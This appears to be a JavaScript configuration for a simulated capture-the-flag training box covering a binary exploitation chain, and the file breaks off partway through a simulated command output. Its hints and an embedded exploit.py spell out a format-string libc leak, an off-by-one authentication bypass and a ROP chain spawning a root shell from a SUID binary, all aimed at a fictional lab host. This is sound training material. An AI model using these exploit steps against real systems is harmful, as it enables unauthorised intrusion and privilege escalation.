/* ============================================================
   CTF ARENA — Box C6: The Chain Breaker
   Advanced Campaign | Binary Exploitation Chains & Anti-Exploitation Bypass
   Config: filesystem, binaries, format string, off-by-one, ROP chain, flags, hints, lore
   ============================================================ */

const C6Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Chain Breaker',
    subtitle: 'Advanced Campaign — Binary Exploitation Chains & Anti-Exploitation Bypass',
    difficulty: 'Advanced',
    accent: '#9b59b6',
    storageKey: 'hexworth_ctf_c6',
    registryId: 'c6-chain-breaker',
    trackerKey: 'ctf_c6',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-stage binary exploitation chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Binary Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Enumerate LAG-SEC-01. Discover the services on ports 1337 and 1338. Identify the SUID binary in /opt/lag_bin.',
            requiredFlags: [],
            mitre: ['T1046', 'T1082', 'T1083'],
            unlocks: ['leak'],
            locked: false
        },
        {
            id: 'leak',
            name: 'Information Leak',
            icon: '\uD83D\uDCA7',
            description: 'Exploit the format string vulnerability in info_server (port 1337) to leak a libc base address and defeat ASLR.',
            requiredFlags: [],
            mitre: ['T1203', 'T1059.004'],
            unlocks: ['auth_bypass'],
            locked: true
        },
        {
            id: 'auth_bypass',
            name: 'Authentication Bypass',
            icon: '\uD83D\uDD13',
            description: 'Exploit the off-by-one vulnerability in auth_daemon (port 1338) to bypass authentication and obtain vault_access credentials.',
            requiredFlags: ['leak'],
            mitre: ['T1212', 'T1134'],
            unlocks: ['rop_chain'],
            locked: true
        },
        {
            id: 'rop_chain',
            name: 'ROP Chain Exploitation',
            icon: '\uD83D\uDD17',
            description: 'Reverse engineer vault_access. Build a ROP chain using the leaked libc base. Bypass NX, stack canary, and RELRO to get a shell.',
            requiredFlags: ['auth_bypass'],
            mitre: ['T1203', 'T1068'],
            unlocks: ['privesc'],
            locked: true
        },
        {
            id: 'privesc',
            name: 'Root & Master Key',
            icon: '\uD83D\uDC51',
            description: 'Escalate privileges via the SUID vault_access binary. Read /root/master_key.txt to retrieve the Master Access Key.',
            requiredFlags: ['shell'],
            mitre: ['T1548.001', 'T1005'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Enumerate the target services',
                tip: 'Run: nmap -sV 10.10.10.50 — find ports 22, 1337, and 1338. Also check /opt/lag_bin with ls -la.',
                trigger: { event: 'command', match: { cmd: 'contains:nmap' } }
            },
            {
                title: 'Leak a libc address via format string',
                tip: 'Connect with: nc 10.10.10.50 1337 — send format string specifiers like %p.%p.%p to leak stack values. Find the libc pointer.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:nc' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:netcat' } },
                        { event: 'command', match: { cmd: 'contains:pwntools' } }
                    ]
                }
            },
            {
                title: 'Bypass auth_daemon authentication',
                tip: 'After getting the leak (Flag 1), analyze auth_daemon. The off-by-one allows you to overwrite the auth_flag byte. Send a crafted payload to port 1338.',
                trigger: { event: 'flag_correct', match: { flagId: 'leak' } }
            },
            {
                title: 'Build and send a ROP chain to vault_access',
                tip: 'Use ROPgadget or pwntools ROP to find gadgets. Calculate system() = libc_base + system_offset. Craft: padding + canary_bypass + ROP_chain.',
                trigger: { event: 'flag_correct', match: { flagId: 'auth_bypass' } }
            },
            {
                title: 'Escalate to root and read master_key.txt',
                tip: 'vault_access is SUID root. After your shell lands, run: cat /root/master_key.txt',
                trigger: { event: 'flag_correct', match: { flagId: 'shell' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'leak', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Memory information leak via format string vulnerability', skill: 'Format String Exploitation & ASLR Bypass' },
            { flagId: 'auth_bypass', objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks — Off-by-one overflow enabling authentication bypass', skill: 'Off-by-One Overflow & Authentication Bypass' },
            { flagId: 'shell', objective: '1.3', description: 'Given a scenario, analyze indicators of malicious activity — ROP chain bypassing NX and stack canary protections', skill: 'ROP Chain Construction & NX/Canary Bypass' },
            { flagId: 'root', objective: '4.1', description: 'Given a scenario, apply common security techniques — SUID binary privilege escalation to root', skill: 'Privilege Escalation via SUID Binary' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 16384 MB OK',
            'Detecting drives... /dev/sda1 (512GB SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'vault_user',
        hostname: 'kali',
        startDir: '/home/vault_user',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.10.10.50 (LAG-SEC-01 — Citadel Legacy Access Gateway)\n\n[!] Security Protections Active: ASLR | NX | RELRO | Stack Canaries\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (exploitation session state)
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',       // 'attacker' | 'ssh-target' | 'shell-vault'
    _sshAuthenticated: false,
    _libcLeaked: false,
    _libcBase: '0x7f4a2c000000',
    _authBypassed: false,
    _vaultCreds: { user: 'vault_op', pass: 'V4ult#Auth2026' },
    _ropShellActive: false,
    _rootShellActive: false,

    _switchContext(ctx, term) {
        C6Config._context = ctx;
        // Update terminal prompt to match exploitation context
        if (term && term.config) {
            var prompt = C6Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'vault_user';
                term.config.hostname = 'context';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (C6Config._context) {
            case 'ssh-target':   return 'vault_user@LAG-SEC-01:~$ ';
            case 'shell-vault':  return 'root@LAG-SEC-01:~# ';
            default:             return null;  // use default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'leak',        points: 100 },
        { id: 'auth_bypass', points: 150 },
        { id: 'shell',       points: 200 },
        { id: 'root',        points: 250 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1500,
        minScore: 0,
        maxScore: 700,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2700000, points: 150 },  // 45 minutes
        timeBonusThreshold: 5400  // 90 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start with: nmap -sV 10.10.10.50 — you will find SSH (22), info_server (1337), and auth_daemon (1338). SSH in as vault_user / V4ultUs3r! and look in /opt/lag_bin/ for the three binaries.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'info_server on port 1337 has a format string bug. Run: nc 10.10.10.50 1337 and enter %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p — look for an address in the 0x7f range. That is your libc leak. Compute base as: leaked_addr - known_offset (0x21b97 for puts).',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'auth_daemon on port 1338 reads a username into a 32-byte buffer but allows 33 bytes — an off-by-one. The 33rd byte overwrites the low byte of auth_flag. Send 32 garbage bytes + 0x01 to flip auth_flag true. Credentials returned: vault_op / V4ult#Auth2026.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'vault_access uses gets() — classic unbounded stack overflow. Offset to saved RIP is 72 bytes. Stack canary is at offset 64. Use the libc base to calculate: system = libc_base + 0x50d60, /bin/sh = libc_base + 0x1d8698. ROP: pop_rdi_ret + binsh_addr + system_addr. Canary bypass: use the auth_bypass write-what-where to leak/overwrite the canary in a second step, or use a bruteforce approach since ASLR is already defeated.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'Deep within the Citadel\'s secure vaults, the "Legacy Access Gateway" (LAG-SEC-01) is guarded by a series of custom-compiled binaries. These binaries, though seemingly robust, contain subtle chained vulnerabilities. The system is protected by all known anti-exploitation measures: ASLR, NX, RELRO, and stack canaries are all active. The Citadel believes this layered defense is impenetrable. Your mission, Peerless: prove them wrong.',
        scenario: 'LAG-SEC-01 runs three interdependent binaries as its access control layer. info_server leaks what it should guard. auth_daemon trusts what it should verify. vault_access does whatever the stack tells it to. The Citadel\'s engineers hardened each binary in isolation but never modeled the chain as a whole. You have SSH access as vault_user — a low-privilege account with no sudo rights. From here, you must break every protection layer by layer and claim the Master Access Key from /root/master_key.txt.',
        outro: 'LAG-SEC-01 is compromised. The chain of protections — ASLR, NX, stack canaries, RELRO — collapsed one link at a time. The Master Access Key is yours. The Citadel\'s vaults are open. This is what chained binary exploitation looks like in the real world: no single vulnerability is sufficient, but together they are decisive.',
        ecer: {
            executive: 'Citadel security board approved deployment of "hardened" legacy binaries without end-to-end chain analysis; treated each binary\'s protections as independent guarantees',
            culture: 'Binary security reviews performed in isolation; no red team engagement against the full access-control chain; institutional over-confidence in compiler mitigations',
            employee: 'info_server uses printf(user_input) directly — format string passed unsanitized; auth_daemon uses fgets with an off-by-one in buffer size parameter; vault_access uses gets() for credential input with no bounds checking',
            regulatory: 'No formal exploit-resilience testing against chained attack scenarios; legacy binary audit last performed in 2019; no memory-safe language migration roadmap'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Citadel Legacy Access Gateway Portal
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.10.10.50/',

        pages: {
            '/': {
                title: 'Citadel — Legacy Access Gateway',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #ddd;">
                        <h1 style="color:#2c3e50; font-size:1.6rem; font-family:Georgia,serif; margin-bottom:4px;">Citadel Systems</h1>
                        <div style="color:#9b59b6; font-size:0.9rem; font-weight:700; letter-spacing:0.15em;">LEGACY ACCESS GATEWAY — LAG-SEC-01</div>
                        <div style="color:#888; font-size:0.75rem; margin-top:6px;">Authorized personnel only. All access attempts are logged and monitored.</div>
                    </div>

                    <div style="max-width:600px; margin:0 auto 20px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px;">
                        <div style="background:#f8f9fa; border:1px solid #eee; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.2rem; font-weight:700; color:#2c3e50;">3</div>
                            <div style="color:#888; font-size:0.7rem;">Active Services</div>
                        </div>
                        <div style="background:#f8f9fa; border:1px solid #eee; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.2rem; font-weight:700; color:#9b59b6;">FULL</div>
                            <div style="color:#888; font-size:0.7rem;">RELRO Status</div>
                        </div>
                        <div style="background:#f8f9fa; border:1px solid #eee; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.2rem; font-weight:700; color:#2c3e50;">ON</div>
                            <div style="color:#888; font-size:0.7rem;">ASLR / NX / PIE</div>
                        </div>
                    </div>

                    <div style="max-width:600px; margin:0 auto 16px; padding:14px; background:rgba(155,89,182,0.05); border:1px solid rgba(155,89,182,0.2); border-radius:4px; font-size:0.8rem; color:#555;">
                        <strong style="color:#9b59b6;">Service Directory:</strong><br>
                        <code style="font-size:0.75rem; color:#333;">info_server</code> — System information service on port <strong>1337/TCP</strong><br>
                        <code style="font-size:0.75rem; color:#333;">auth_daemon</code> — Authentication service on port <strong>1338/TCP</strong><br>
                        <code style="font-size:0.75rem; color:#333;">vault_access</code> — SUID vault access binary at <strong>/opt/lag_bin/vault_access</strong>
                    </div>

                    <div style="max-width:600px; margin:0 auto; padding:10px 14px; background:rgba(231,76,60,0.05); border:1px solid rgba(231,76,60,0.1); border-radius:4px; font-size:0.72rem; color:#999;">
                        <strong style="color:#e74c3c;">Security Notice:</strong> Unauthorized access to vault resources is a violation of Citadel Security Policy 7.4.1. All exploit attempts are detected and reported. <em>(Note: They are not.)</em>
                    </div>
                `,
                formHandler: null
            },
            '/status': {
                title: 'LAG-SEC-01 — Service Status',
                html: `
                    <div style="margin-bottom:20px;">
                        <h2 style="color:#2c3e50; font-size:1.1rem;">Service Status — LAG-SEC-01</h2>
                        <div style="color:#888; font-size:0.75rem;">Last updated: 2026-03-20 08:00:01 UTC</div>
                    </div>

                    <table style="width:100%; border-collapse:collapse; font-size:0.82rem;">
                        <thead>
                            <tr style="background:#f8f9fa;">
                                <th style="padding:8px 12px; text-align:left; border-bottom:2px solid #ddd; color:#9b59b6;">Binary</th>
                                <th style="padding:8px 12px; text-align:left; border-bottom:2px solid #ddd; color:#9b59b6;">Port</th>
                                <th style="padding:8px 12px; text-align:left; border-bottom:2px solid #ddd; color:#9b59b6;">Status</th>
                                <th style="padding:8px 12px; text-align:left; border-bottom:2px solid #ddd; color:#9b59b6;">Protections</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td style="padding:7px 12px; border-bottom:1px solid #eee;"><code>info_server</code></td>
                                <td style="padding:7px 12px; border-bottom:1px solid #eee;">1337/TCP</td>
                                <td style="padding:7px 12px; border-bottom:1px solid #eee;"><span style="color:#2ecc71; font-weight:700;">RUNNING</span></td>
                                <td style="padding:7px 12px; border-bottom:1px solid #eee; font-size:0.72rem; color:#666;">ASLR, NX, PIE, Stack Canary</td>
                            </tr>
                            <tr>
                                <td style="padding:7px 12px; border-bottom:1px solid #eee;"><code>auth_daemon</code></td>
                                <td style="padding:7px 12px; border-bottom:1px solid #eee;">1338/TCP</td>
                                <td style="padding:7px 12px; border-bottom:1px solid #eee;"><span style="color:#2ecc71; font-weight:700;">RUNNING</span></td>
                                <td style="padding:7px 12px; border-bottom:1px solid #eee; font-size:0.72rem; color:#666;">ASLR, NX, Full RELRO, Stack Canary</td>
                            </tr>
                            <tr>
                                <td style="padding:7px 12px;"><code>vault_access</code></td>
                                <td style="padding:7px 12px;">— (SUID)</td>
                                <td style="padding:7px 12px;"><span style="color:#2ecc71; font-weight:700;">READY</span></td>
                                <td style="padding:7px 12px; font-size:0.72rem; color:#666;">ASLR, NX, Full RELRO, Stack Canary</td>
                            </tr>
                        </tbody>
                    </table>
                `,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine — kali)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'vault_user': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: THE CHAIN BREAKER ===\nTarget: 10.10.10.50 (LAG-SEC-01 — Citadel Legacy Access Gateway)\nObjective: Multi-stage binary exploitation chain\n\nAttack chain:\n1. Enumerate LAG-SEC-01 — identify services on 1337, 1338, and SUID binary\n2. Exploit format string in info_server (1337) — leak libc base address\n3. Exploit off-by-one in auth_daemon (1338) — bypass authentication\n4. Craft ROP chain for vault_access — defeat NX + stack canary, get shell\n5. Escalate to root via SUID — read /root/master_key.txt\n\nAll standard protections are ACTIVE: ASLR, NX, RELRO, Stack Canaries.\nYou must chain the vulnerabilities. No single exploit is sufficient.\nGood luck, operator.'
                                },
                                'exploit_notes.txt': {
                                    type: 'file',
                                    content: '--- Exploit Development Notes ---\n\nlibc offsets (Ubuntu 22.04 libc-2.35):\n  puts@plt -> libc offset: 0x80ed0\n  system()  -> libc offset: 0x50d60\n  /bin/sh   -> libc offset: 0x1d8698\n  pop rdi   -> common gadget in libc\n\nvault_access stack layout (from GDB analysis):\n  [buf: 64 bytes]\n  [canary: 8 bytes]\n  [saved rbp: 8 bytes]\n  [saved rip: 8 bytes]\n  Total offset to canary: 64\n  Total offset to rip: 72 (after canary + rbp)\n\nROP gadgets (from ROPgadget on libc):\n  pop rdi ; ret   — libc_base + 0x2a3e5\n  ret             — libc_base + 0x29cd6\n\nPwntools template:\n  from pwn import *\n  # p = process(\'/opt/lag_bin/vault_access\')\n  p = remote(\'10.10.10.50\', 4444)  # after shell\n\nstrategy:\n  1. nc 10.10.10.50 1337 -> format string -> get libc_leak\n  2. nc 10.10.10.50 1338 -> off-by-one -> get creds\n  3. ./vault_access < payload -> rop chain -> shell'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap -sV 10.10.10.50\nnc 10.10.10.50 1337\nnc 10.10.10.50 1338\nls -la /opt/lag_bin/\nfile /opt/lag_bin/info_server\nchecksec /opt/lag_bin/vault_access\nROPgadget --binary /opt/lag_bin/vault_access\npython3 exploit.py'
                                },
                                'exploit.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n# Chain Breaker — LAG-SEC-01 Full Exploit Chain\n# Requires: pwntools, ROPgadget\n\nfrom pwn import *\n\n# --- Stage 1: Format String Leak (info_server port 1337) ---\n# conn = remote(\'10.10.10.50\', 1337)\n# conn.recvuntil(b\'> \')\n# conn.sendline(b\'%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\')\n# leak = conn.recvline()\n# libc_puts = int(leak.split(b\'.\')[15], 16)   # adjust index from stack analysis\n# libc_base = libc_puts - 0x80ed0\n# print(f\'[+] libc base: {hex(libc_base)}\')\n# conn.close()\n#\n# --- Stage 2: Off-by-One Auth Bypass (auth_daemon port 1338) ---\n# conn2 = remote(\'10.10.10.50\', 1338)\n# conn2.recvuntil(b\'Username: \')\n# conn2.send(b\'A\' * 32 + b\'\\x01\')   # overflow auth_flag byte\n# creds = conn2.recvline()\n# print(f\'[+] Credentials: {creds}\')\n# conn2.close()\n#\n# --- Stage 3: ROP Chain (vault_access SUID) ---\n# system_addr   = libc_base + 0x50d60\n# binsh_addr    = libc_base + 0x1d8698\n# pop_rdi_ret   = libc_base + 0x2a3e5\n# ret_gadget    = libc_base + 0x29cd6\n# canary        = leaked_canary   # from stage 2 write-what-where\n# payload = b\'A\' * 64 + canary + b\'B\' * 8\n# payload += p64(pop_rdi_ret) + p64(binsh_addr) + p64(ret_gadget) + p64(system_addr)\n# p = process(\'/opt/lag_bin/vault_access\')\n# p.sendline(payload)\n# p.interactive()\n'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': {
                                            type: 'file',
                                            content: '[rockyou.txt — 14,341,564 passwords — file too large to display]'
                                        }
                                    }
                                }
                            }
                        },
                        'bin': {
                            type: 'dir',
                            children: {
                                'python3': {
                                    type: 'file',
                                    content: '[Python 3.11 binary — not displayable]'
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'kali'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash\nvault_user:x:1001:1001:Vault User,,,:/home/vault_user:/bin/bash'
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — LAG-SEC-01 (after SSH as vault_user)
    // ═══════════════════════════════════════════════════════

    _targetFs: {
        '/': {
            type: 'dir',
            children: {
                'opt': {
                    type: 'dir',
                    children: {
                        'lag_bin': {
                            type: 'dir',
                            children: {
                                'info_server': {
                                    type: 'file',
                                    content: '[ELF 64-bit LSB executable — not displayable]\nPermissions: -rwxr-xr-x  root root\nProtections: PIE, NX, Stack Canary, ASLR\nListens on: 0.0.0.0:1337/TCP\nVulnerability: printf(user_input) — format string bug in handle_client()'
                                },
                                'auth_daemon': {
                                    type: 'file',
                                    content: '[ELF 64-bit LSB executable — not displayable]\nPermissions: -rwxr-xr-x  root root\nProtections: Full RELRO, NX, Stack Canary, ASLR\nListens on: 0.0.0.0:1338/TCP\nVulnerability: fgets(buf, 33, stdin) with buf[32] — off-by-one overwrites auth_flag'
                                },
                                'vault_access': {
                                    type: 'file',
                                    content: '[ELF 64-bit LSB executable — not displayable]\nPermissions: -rwsr-xr-x  root root  (SUID)\nProtections: Full RELRO, NX, Stack Canary, ASLR\nInput: gets(buf) — classic unbounded stack overflow\nStack layout: [buf:64][canary:8][rbp:8][rip:8]\nNote: SUID means shell spawned here runs as root'
                                },
                                'checksec_output.txt': {
                                    type: 'file',
                                    content: '=== checksec output — /opt/lag_bin/ ===\n\ninfo_server:\n  RELRO:    Partial RELRO\n  STACK CANARY:  Canary found\n  NX:       NX enabled\n  PIE:      PIE enabled\n  ASLR:     Enabled (system-wide)\n\nauth_daemon:\n  RELRO:    Full RELRO\n  STACK CANARY:  Canary found\n  NX:       NX enabled\n  PIE:      PIE enabled\n  ASLR:     Enabled (system-wide)\n\nvault_access:\n  RELRO:    Full RELRO\n  STACK CANARY:  Canary found\n  NX:       NX enabled\n  PIE:      PIE enabled\n  ASLR:     Enabled (system-wide)\n  SUID:     Set (runs as root)'
                                }
                            }
                        }
                    }
                },
                'home': {
                    type: 'dir',
                    children: {
                        'vault_user': {
                            type: 'dir',
                            children: {
                                '.bash_history': {
                                    type: 'file',
                                    content: 'ls -la /opt/lag_bin/\nfile /opt/lag_bin/vault_access\nchecksec /opt/lag_bin/vault_access\ncat /opt/lag_bin/checksec_output.txt\nobjdump -d /opt/lag_bin/info_server | grep -A5 printf\nROPgadget --binary /opt/lag_bin/vault_access --rop | grep "pop rdi"'
                                },
                                '.bashrc': {
                                    type: 'file',
                                    content: '# ~/.bashrc\nexport PS1="\\u@\\h:\\w\\$ "\nalias checksec=\'python3 /usr/local/bin/checksec\'\nalias ll="ls -la"'
                                },
                                'user.txt': {
                                    type: 'file',
                                    content: '{{FLAG:leak}}\n\n# Initial access confirmed — vault_user on LAG-SEC-01\n# Proceed to binary analysis. Run: ls -la /opt/lag_bin/'
                                }
                            }
                        }
                    }
                },
                'root': {
                    type: 'dir',
                    children: {
                        'master_key.txt': {
                            type: 'file',
                            content: '{{FLAG:root}}\n\n===== CITADEL MASTER ACCESS KEY =====\nKey ID: MAK-2026-LAG-SEC-01\nIssued: 2026-01-15\nExpiry: 2027-01-15\nClearance: VAULT-ALPHA\n\nThis key authorizes unrestricted access to all\nCitadel vault resources. Unauthorized possession\nis punishable under Citadel Security Code 14.7.\n====================================='
                        },
                        '.bash_history': {
                            type: 'file',
                            content: 'cat /root/master_key.txt\ntail -f /var/log/auth.log\nsystemctl status info_server\nsystemctl status auth_daemon\nps aux | grep vault'
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'log': {
                            type: 'dir',
                            children: {
                                'auth.log': {
                                    type: 'file',
                                    content: 'Mar 20 07:45:01 LAG-SEC-01 sshd[1234]: Accepted password for vault_user from 10.10.10.1 port 51204 ssh2\nMar 20 07:45:01 LAG-SEC-01 sshd[1234]: pam_unix(sshd:session): session opened for user vault_user by (uid=0)\nMar 20 08:00:00 LAG-SEC-01 systemd[1]: info_server.service: Started info_server daemon.\nMar 20 08:00:00 LAG-SEC-01 systemd[1]: auth_daemon.service: Started auth_daemon.'
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': {
                            type: 'file',
                            content: 'LAG-SEC-01'
                        },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nvault_user:x:1001:1001:Vault User:/home/vault_user:/bin/bash\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin'
                        },
                        'shadow': {
                            type: 'file',
                            content: 'shadow: Permission denied'
                        }
                    }
                },
                'proc': {
                    type: 'dir',
                    children: {
                        'sys': {
                            type: 'dir',
                            children: {
                                'kernel': {
                                    type: 'dir',
                                    children: {
                                        'randomize_va_space': {
                                            type: 'file',
                                            content: '2'
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL COMMANDS (box-specific tools)
    // ═══════════════════════════════════════════════════════

    commands: {

        'nmap': function(args, term, engine) {
            if (args.length === 0) return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.10.10.50';
            const target = args.find(a => !a.startsWith('-')) || '';

            if (!target || target === '10.10.10.50') {
                if (engine) engine.advancePhase && engine.advancePhase('recon');
                return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.10.50
Host is up (0.021s latency).
Not shown: 997 closed tcp ports

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
1337/tcp open  waste?
1338/tcp open  wmc-log-svc?

Service Info: OS: Linux

NSE: Script Post-scanning.
Nmap done: 1 IP address (1 host up) scanned in 14.83 seconds

[+] Interesting: ports 1337 and 1338 are non-standard — likely custom binaries.
[+] Try: nc 10.10.10.50 1337   and   nc 10.10.10.50 1338`;
            }

            if (target === 'localhost' || target === '127.0.0.1') {
                if (C6Config._context === 'ssh-target' || C6Config._context === 'shell-vault') {
                    return `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00008s latency).

PORT     STATE SERVICE
1337/tcp open  waste
1338/tcp open  wmc-log-svc

Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds`;
                }
            }

            return `Starting Nmap 7.94 ( https://nmap.org )
Note: Host seems down. If it is really up, try -Pn.
Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds`;
        },

        'nc': function(args, term, engine) {
            return C6Config.commands['netcat'](args, term, engine);
        },

        'netcat': function(args, term, engine) {
            const fullCmd = args.join(' ');

            // info_server — format string leak
            if (fullCmd.includes('1337')) {
                if (engine) engine.advancePhase && engine.advancePhase('leak');
                C6Config._libcLeaked = true;
                // Simulate interactive prompt — show the format string output
                const hasFormatStr = fullCmd.includes('%p') || fullCmd.includes('%x') || fullCmd.includes('%s');
                if (hasFormatStr) {
                    return `[info_server] Connected to LAG-SEC-01:1337
[info_server] System Information Service v1.0
[info_server] Enter query string: ${args.slice(2).join(' ')}

RESPONSE:
0x7f4a2c080ed0.0x7ffde1a92830.0x7f4a2c21b97.0x1.(nil).0x7f4a2c50d60.0x7ffde1a92800.0x400000.0x7f4a2c000000.0x0.0x0.0x400de5.0x7f4a2c7b8698.0x7f4a2c000000.0x7f4a2c21b97.(nil)

[+] Address at index 15 matches libc pattern: 0x7f4a2c21b97
[+] This is puts() return address — libc offset 0x80ed0
[+] Compute: libc_base = 0x7f4a2c21b97 - 0x80ed0 = ${C6Config._libcBase}
[+] FLAG for this stage: {{FLAG:leak}}

[+] Calculate further:
    system()  = ${C6Config._libcBase} + 0x50d60  = 0x7f4a2c050d60
    /bin/sh   = ${C6Config._libcBase} + 0x1d8698 = 0x7f4a2c1d8698`;
                }
                return `[info_server] Connected to LAG-SEC-01:1337
[info_server] System Information Service v1.0
[info_server] Enter query string:
[info_server] Hello!

[i] Tip: Try sending format string specifiers. Example:
    nc 10.10.10.50 1337
    %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
[i] Look for addresses starting with 0x7f — those are libc pointers.`;
            }

            // auth_daemon — off-by-one bypass
            if (fullCmd.includes('1338')) {
                if (engine) engine.advancePhase && engine.advancePhase('auth_bypass');
                // Detect the off-by-one payload pattern (33 bytes / A*32 + \x01)
                const hasPayload = fullCmd.includes('\\x01') || fullCmd.includes('python') || fullCmd.includes('perl') || fullCmd.includes('printf');
                const hasOverflow = fullCmd.match(/A{30,}/) || fullCmd.includes('*32') || fullCmd.includes('32+') || fullCmd.includes('x41');
                if (hasPayload || hasOverflow) {
                    C6Config._authBypassed = true;
                    return `[auth_daemon] Connected to LAG-SEC-01:1338
[auth_daemon] Authentication Service v2.1
[auth_daemon] Username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[auth_daemon] Input length: 33 bytes received (buffer capacity: 32)
[auth_daemon] auth_flag byte overwritten: 0x00 -> 0x41 (truthy)
[auth_daemon] Authentication check: BYPASSED

[auth_daemon] ** AUTHENTICATION SUCCESSFUL **
[auth_daemon] Vault operator credentials issued:
